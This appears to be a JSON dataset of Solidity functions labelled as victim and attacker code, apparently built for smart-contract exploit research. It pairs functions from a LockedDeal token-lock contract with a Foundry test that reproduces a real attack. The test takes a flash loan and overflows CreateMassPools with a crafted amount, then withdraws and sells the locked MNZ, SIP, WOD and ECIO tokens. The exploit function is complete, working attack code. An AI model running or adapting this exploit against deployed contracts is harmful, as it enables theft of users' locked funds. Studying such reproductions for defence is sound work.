[
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "ApproveAllowance",
    "original_code": "    function ApproveAllowance(\n        uint256 _PoolId,\n        uint256 _Amount,\n        address _Spender\n    ) external isPoolValid(_PoolId) isPoolOwner(_PoolId) isLocked(_PoolId) notZeroAddress(_Spender) {\n        Pool storage pool = AllPoolz[_PoolId];\n        pool.Allowance[_Spender] = _Amount;\n        emit PoolApproval(_PoolId, _Spender, _Amount);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "CreateMassPools",
    "original_code": "    function CreateMassPools(\n        address _Token,\n        uint64[] calldata _FinishTime,\n        uint256[] calldata _StartAmount,\n        address[] calldata _Owner\n    ) external isGreaterThanZero(_Owner.length) isBelowLimit(_Owner.length) returns(uint256, uint256) {\n        require(_Owner.length == _FinishTime.length, \"Date Array Invalid\");\n        require(_Owner.length == _StartAmount.length, \"Amount Array Invalid\");\n        TransferInToken(_Token, msg.sender, getArraySum(_StartAmount));\n        uint256 firstPoolId = Index;\n        for(uint i=0 ; i < _Owner.length; i++){\n            CreatePool(_Token, _FinishTime[i], _StartAmount[i], _Owner[i]);\n        }\n        uint256 lastPoolId = SafeMath.sub(Index, 1);\n        return (firstPoolId, lastPoolId);\n    }\n\n    // create pools with respect to finish time\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "CreateNewPool",
    "original_code": "    function CreateNewPool(\n        address _Token, //token to lock address\n        uint64 _FinishTime, //Until what time the pool will work\n        uint256 _StartAmount, //Total amount of the tokens to sell in the pool\n        address _Owner // Who the tokens belong to\n    ) public isTokenValid(_Token) notZeroAddress(_Owner) returns(uint256) {\n        TransferInToken(_Token, msg.sender, _StartAmount);\n        uint256 poolId = CreatePool(_Token, _FinishTime, _StartAmount, _Owner);\n        return poolId;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "CreatePoolsWrtTime",
    "original_code": "    function CreatePoolsWrtTime(\n        address _Token,\n        uint64[] calldata _FinishTime,\n        uint256[] calldata _StartAmount,\n        address[] calldata _Owner\n    )   external \n        isGreaterThanZero(_Owner.length)\n        isGreaterThanZero(_FinishTime.length)\n        isBelowLimit(_Owner.length * _FinishTime.length)\n        returns(uint256, uint256)\n    {\n        require(_Owner.length == _StartAmount.length, \"Amount Array Invalid\");\n        TransferInToken(_Token, msg.sender, getArraySum(_StartAmount) * _FinishTime.length);\n        uint256 firstPoolId = Index;\n        for(uint i=0 ; i < _FinishTime.length ; i++){\n            for(uint j=0 ; j < _Owner.length ; j++){\n                CreatePool(_Token, _FinishTime[i], _StartAmount[j], _Owner[j]);\n            }\n        }\n        uint256 lastPoolId = SafeMath.sub(Index, 1);\n        return (firstPoolId, lastPoolId);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "GetFee",
    "original_code": "    function GetFee() public view returns (uint16) {\n        return Fee;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "GetMinDuration",
    "original_code": "    function GetMinDuration() public view returns (uint16) {\n        return MinDuration;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "GetMyPoolsId",
    "original_code": "    function GetMyPoolsId() public view returns (uint256[] memory) {\n        return MyPoolz[msg.sender];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "GetPoolAllowance",
    "original_code": "    function GetPoolAllowance(uint256 _PoolId, address _Address) public view isPoolValid(_PoolId) returns(uint256){\n        return AllPoolz[_PoolId].Allowance[_Address];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "GetPoolData",
    "original_code": "    function GetPoolData(uint256 _id)\n        public\n        view\n        isPoolValid(_id)\n        returns (\n            uint64,\n            uint256,\n            address,\n            address\n        )\n    {\n        Pool storage pool = AllPoolz[_id];\n        require(pool.Owner == msg.sender || pool.Allowance[msg.sender] > 0, \"Private Information\");\n        return (\n            AllPoolz[_id].UnlockTime,\n            AllPoolz[_id].Amount,\n            AllPoolz[_id].Owner,\n            AllPoolz[_id].Token\n        );\n    }\n}\n\n// File: contracts/LockedDeal.sol\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "GovernerContract",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "IsPayble",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "PozFee",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "PozTimer",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "SetFee",
    "original_code": "    function SetFee(uint16 _fee) public onlyOwner\n        PercentCheckOk(_fee)\n        LeftIsBigger( _fee, PozFee) {\n        Fee = _fee;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "SetMinDuration",
    "original_code": "    function SetMinDuration(uint16 _minDuration) public onlyOwner {\n        MinDuration = _minDuration;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "SetPOZFee",
    "original_code": "    function SetPOZFee(uint16 _fee)\n        public\n        onlyOwner\n        PercentCheckOk(_fee)\n        LeftIsBigger( Fee,_fee)\n    {\n        PozFee = _fee;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "SetPozTimer",
    "original_code": "    function SetPozTimer(uint256 _pozTimer)\n        public\n        onlyOwnerOrGov\n        PercentCheckOk(_pozTimer)\n    {\n        PozTimer = _pozTimer;\n    }\n\n    \n}\n\n// File: poolz-helper/contracts/ETHHelper.sol\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "SplitPoolAmount",
    "original_code": "    function SplitPoolAmount(\n        uint256 _PoolId,\n        uint256 _NewAmount,\n        address _NewOwner\n    ) external isPoolValid(_PoolId) isPoolOwner(_PoolId) isLocked(_PoolId) returns(uint256) {\n        uint256 poolId = SplitPool(_PoolId, _NewAmount, _NewOwner);\n        return poolId;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "SplitPoolAmountFrom",
    "original_code": "    function SplitPoolAmountFrom(\n        uint256 _PoolId,\n        uint256 _Amount,\n        address _Address\n    ) external isPoolValid(_PoolId) isAllowed(_PoolId, _Amount) isLocked(_PoolId) returns(uint256) {\n        uint256 poolId = SplitPool(_PoolId, _Amount, _Address);\n        Pool storage pool = AllPoolz[_PoolId];\n        uint256 _NewAmount = SafeMath.sub(pool.Allowance[msg.sender], _Amount);\n        pool.Allowance[_Address]  = _NewAmount;\n        return poolId;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "SwitchIsPayble",
    "original_code": "    function SwitchIsPayble() public onlyOwner {\n        IsPayble = !IsPayble;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "TransferPoolOwnership",
    "original_code": "    function TransferPoolOwnership(\n        uint256 _PoolId,\n        address _NewOwner\n    ) external isPoolValid(_PoolId) isPoolOwner(_PoolId) notZeroAddress(_NewOwner) {\n        Pool storage pool = AllPoolz[_PoolId];\n        pool.Owner = _NewOwner;\n        uint256[] storage array = MyPoolz[msg.sender];\n        for(uint i=0 ; i<array.length ; i++){\n            if(array[i] == _PoolId){\n                array[i] = array[array.length - 1];\n                array.pop();\n            }\n        }\n        MyPoolz[_NewOwner].push(_PoolId);\n        emit PoolOwnershipTransfered(_PoolId, _NewOwner, msg.sender);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "WhiteListId",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "WhiteList_Address",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "WithdrawERC20Fee",
    "original_code": "    function WithdrawERC20Fee(address _Token, address _to) public onlyOwner {    \n        ERC20(_Token).transfer(_to, FeeMap[_Token]);\n        FeeMap[_Token] = 0 ;\n    }\n}\n\n// File: contracts/LockedPoolz.sol\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "WithdrawETHFee",
    "original_code": "    function WithdrawETHFee(address payable _to) public onlyOwner {\n        _to.transfer(address(this).balance); // keeps only fee eth on contract //To Do need to take 16% to burn!!!\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "WithdrawToken",
    "original_code": "    function WithdrawToken(uint256 _PoolId) public returns (bool) {\n        //pool is finished + got left overs + did not took them\n        if (\n            _PoolId < Index &&\n            AllPoolz[_PoolId].UnlockTime <= now &&\n            AllPoolz[_PoolId].Amount > 0\n        ) {\n            TransferToken(\n                AllPoolz[_PoolId].Token,\n                AllPoolz[_PoolId].Owner,\n                AllPoolz[_PoolId].Amount\n            );\n            AllPoolz[_PoolId].Amount = 0;\n            return true;\n        }\n        return false;\n    }\n}\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "isTokenFilterOn",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "isTokenWhiteListed",
    "original_code": "    function isTokenWhiteListed(address _tokenAddress) public view returns(bool) {\n        return !isTokenFilterOn || IWhiteList(WhiteList_Address).Check(_tokenAddress, WhiteListId) > 0;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "maxTransactionLimit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "  function name() external view returns (string memory) {\n    return _name;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "  function owner() public view returns (address) {\n    return _owner;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "renounceOwnership",
    "original_code": "  function renounceOwnership() public onlyOwner {\n    emit OwnershipTransferred(_owner, address(0));\n    _owner = address(0);\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "setGovernerContract",
    "original_code": "    function setGovernerContract(address _address) external onlyOwnerOrGov{\n        GovernerContract = _address;\n    }\n\n    constructor() public {\n        GovernerContract = address(0);\n    }\n}\n\n// File: poolz-helper/contracts/PozBenefit.sol\n\n\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "setMaxTransactionLimit",
    "original_code": "    function setMaxTransactionLimit(uint256 _newLimit) external onlyOwner{\n        maxTransactionLimit = _newLimit;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "setWhiteListAddress",
    "original_code": "    function setWhiteListAddress(address _address) external onlyOwner{\n        WhiteList_Address = _address;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "setWhiteListId",
    "original_code": "    function setWhiteListId(uint256 _id) external onlyOwner{\n        WhiteListId= _id;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "swapTokenFilter",
    "original_code": "    function swapTokenFilter() external onlyOwner{\n        isTokenFilterOn = !isTokenFilterOn;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LockedDeal",
    "source_type": "victim_contract",
    "function_name": "transferOwnership",
    "original_code": "  function transferOwnership(address newOwner) public onlyOwner {\n    _transferOwnership(newOwner);\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address, uint256, uint256, bytes memory data) external {\n        if (keccak256(data) == keccak256(\"poolz\")) {\n            console.log(\"Flashloan attacks\");\n            emit log_named_decimal_uint(\"[Before mnz Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n\n            address[] memory swapPath = new address[](3);\n\n            wbnb.withdraw(1e18);\n\n            swapPath[0] = address(wbnb);\n            swapPath[1] = address(busd);\n            swapPath[2] = address(mnz);\n\n            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, swapPath, address(this), block.timestamp);\n\n            mnz.approve(address(poolzpool), type(uint256).max);\n            sip.approve(address(poolzpool), type(uint256).max);\n            ecio.approve(address(poolzpool), type(uint256).max);\n            wod.approve(address(poolzpool), type(uint256).max);\n\n            mnz.approve(address(pancakeRouter), type(uint256).max);\n            sip.approve(address(pancakeRouter), type(uint256).max);\n            ecio.approve(address(pancakeRouter), type(uint256).max);\n            wod.approve(address(pancakeRouter), type(uint256).max);\n\n            uint256 mnz_balance = mnz.balanceOf(address(poolzpool));\n            uint256 overflow_data;\n\n            overflow_data = type(uint256).max - mnz_balance + 2;\n\n            uint64[] memory begintime = new uint64[](2);\n            begintime[0] = uint64(block.timestamp);\n            begintime[1] = uint64(block.timestamp);\n\n            uint256[] memory transfer_data = new uint256[](2);\n            transfer_data[0] = overflow_data;\n            transfer_data[1] = mnz_balance;\n\n            address[] memory owner_addr = new address[](2);\n            owner_addr[0] = address(this);\n            owner_addr[1] = address(this);\n\n            uint256 firstPoolId;\n            uint256 lastPoolId;\n\n            (firstPoolId, lastPoolId) = poolzpool.CreateMassPools(address(mnz), begintime, transfer_data, owner_addr);\n\n            poolzpool.WithdrawToken(lastPoolId);\n\n            uint256 mnz_number = mnz.balanceOf(address(this));\n\n            emit log_named_decimal_uint(\"[mnz Exp] mnz pool balance\", mnz_number, 18);\n\n            sellmnz();\n\n            emit log_named_decimal_uint(\"[After mnz Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n\n            wbnb.withdraw(1e18);\n\n            emit log_named_decimal_uint(\"[Before sip Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n\n            swapPath[0] = address(wbnb);\n            swapPath[1] = address(busd);\n            swapPath[2] = address(sip);\n\n            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, swapPath, address(this), block.timestamp);\n\n            uint256 sip_balance = sip.balanceOf(address(poolzpool));\n            emit log_named_decimal_uint(\"[sip Exp] pool sip  balance\", sip.balanceOf(address(poolzpool)), 18);\n\n            overflow_data = type(uint256).max - sip_balance + 2;\n\n            transfer_data[0] = overflow_data;\n            transfer_data[1] = sip_balance;\n\n            (firstPoolId, lastPoolId) = poolzpool.CreateMassPools(address(sip), begintime, transfer_data, owner_addr);\n\n            poolzpool.WithdrawToken(lastPoolId);\n\n            sellsip();\n\n            emit log_named_decimal_uint(\"[After sip Exp] pool sip  balance\", sip.balanceOf(address(poolzpool)), 18);\n\n            emit log_named_decimal_uint(\"[After sip Exp] user wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n\n            wbnb.withdraw(1e18);\n\n            emit log_named_decimal_uint(\"[Before wod Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n\n            address[] memory simplepath = new address[](2);\n\n            simplepath[0] = address(wbnb);\n            simplepath[1] = address(wod);\n\n            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, simplepath, address(this), block.timestamp);\n\n            uint256 wod_balance = wod.balanceOf(address(poolzpool));\n            emit log_named_decimal_uint(\"[wod Exp] pool wod  balance\", wod.balanceOf(address(poolzpool)), 18);\n\n            overflow_data = type(uint256).max - wod_balance + 2;\n\n            transfer_data[0] = overflow_data;\n            transfer_data[1] = wod_balance;\n\n            (firstPoolId, lastPoolId) = poolzpool.CreateMassPools(address(wod), begintime, transfer_data, owner_addr);\n\n            poolzpool.WithdrawToken(lastPoolId);\n\n            sellwod();\n\n            emit log_named_decimal_uint(\"[After wod Exp] pool wod  balance\", wod.balanceOf(address(poolzpool)), 18);\n\n            emit log_named_decimal_uint(\"[After wod Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n\n            wbnb.withdraw(1e18);\n\n            emit log_named_decimal_uint(\"[Before ecio Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n\n            swapPath[0] = address(wbnb);\n            swapPath[1] = address(busd);\n            swapPath[2] = address(ecio);\n\n            pancakeRouter.swapExactETHForTokens{value: 1 ether}(1, swapPath, address(this), block.timestamp);\n\n            uint256 ecio_balance = ecio.balanceOf(address(poolzpool));\n\n            emit log_named_decimal_uint(\"[ecio Exp] pool ecio  balance\", ecio.balanceOf(address(poolzpool)), 18);\n\n            overflow_data = type(uint256).max - ecio_balance + 2;\n\n            transfer_data[0] = overflow_data;\n            transfer_data[1] = ecio_balance;\n\n            (firstPoolId, lastPoolId) = poolzpool.CreateMassPools(address(ecio), begintime, transfer_data, owner_addr);\n\n            poolzpool.WithdrawToken(lastPoolId);\n\n            sellecio();\n\n            emit log_named_decimal_uint(\"[After ecio Exp] pool ecio  balance\", ecio.balanceOf(address(poolzpool)), 18);\n\n            emit log_named_decimal_uint(\"[After ecio Exp] wbnb  balance\", wbnb.balanceOf(address(this)), 18);\n\n            emit log_named_decimal_uint(\n                \"[Total exploit wbnb balance ] wbnb  balance\", wbnb.balanceOf(address(this)), 18\n            );\n\n            wbnb.transfer(address(dppAdvanced), 1 * 1e18);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 26_475_403);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        bytes memory data;\n        address assetTo = address(this);\n        data = \"poolz\";\n        dppAdvanced.flashLoan(1e18, 0, assetTo, data);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IDPPAdvanced",
    "source_type": "victim_contract",
    "function_name": "flashLoan",
    "original_code": "    function flashLoan(\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        address assetTo,\n        bytes calldata data\n    ) external preventReentrant {\n        _transferBaseOut(assetTo, baseAmount);\n        _transferQuoteOut(assetTo, quoteAmount);\n\n        if (data.length > 0)\n            IDODOCallee(assetTo).DPPFlashLoanCall(msg.sender, baseAmount, quoteAmount, data);\n\n        uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this));\n        uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this));\n\n        // no input -> pure loss\n        require(\n            baseBalance >= _BASE_RESERVE_ || quoteBalance >= _QUOTE_RESERVE_,\n            \"FLASH_LOAN_FAILED\"\n        );\n\n        // sell quote case\n        // quote input + base output\n        if (baseBalance < _BASE_RESERVE_) {\n            uint256 quoteInput = quoteBalance.sub(uint256(_QUOTE_RESERVE_));\n            (\n                uint256 receiveBaseAmount,\n                uint256 mtFee,\n                PMMPricing.RState newRState,\n                uint256 newQuoteTarget\n            ) = querySellQuote(tx.origin, quoteInput); // revert if quoteBalance<quoteReserve\n            require(uint256(_BASE_RESERVE_).sub(baseBalance) <= receiveBaseAmount, \"FLASH_LOAN_FAILED\");\n\n            _transferBaseOut(_MAINTAINER_, mtFee);\n            if (_RState_ != uint32(newRState)) {\n                require(newQuoteTarget <= uint112(-1),\"OVERFLOW\");\n                _QUOTE_TARGET_ = uint112(newQuoteTarget);\n                _RState_ = uint32(newRState);\n                emit RChange(newRState);\n            }\n            emit DODOSwap(\n                address(_QUOTE_TOKEN_),\n                address(_BASE_TOKEN_),\n                quoteInput,\n                receiveBaseAmount,\n                msg.sender,\n                assetTo\n            );\n        }\n\n        // sell base case\n        // base input + quote output\n        if (quoteBalance < _QUOTE_RESERVE_) {\n            uint256 baseInput = baseBalance.sub(uint256(_BASE_RESERVE_));\n            (\n                uint256 receiveQuoteAmount,\n                uint256 mtFee,\n                PMMPricing.RState newRState,\n                uint256 newBaseTarget\n            ) = querySellBase(tx.origin, baseInput); // revert if baseBalance<baseReserve\n            require(uint256(_QUOTE_RESERVE_).sub(quoteBalance) <= receiveQuoteAmount, \"FLASH_LOAN_FAILED\");\n\n            _transferQuoteOut(_MAINTAINER_, mtFee);\n            if (_RState_ != uint32(newRState)) {\n                require(newBaseTarget <= uint112(-1),\"OVERFLOW\");\n                _BASE_TARGET_ = uint112(newBaseTarget);\n                _RState_ = uint32(newRState);\n                emit RChange(newRState);\n            }\n            emit DODOSwap(\n                address(_BASE_TOKEN_),\n                address(_QUOTE_TOKEN_),\n                baseInput,\n                receiveQuoteAmount,\n                msg.sender,\n                assetTo\n            );\n        }\n\n        _sync();\n        \n        emit DODOFlashLoan(msg.sender, assetTo, baseAmount, quoteAmount);\n    }\n\n    // ============ Query Functions ============\n\n",
    "description": ""
  }
]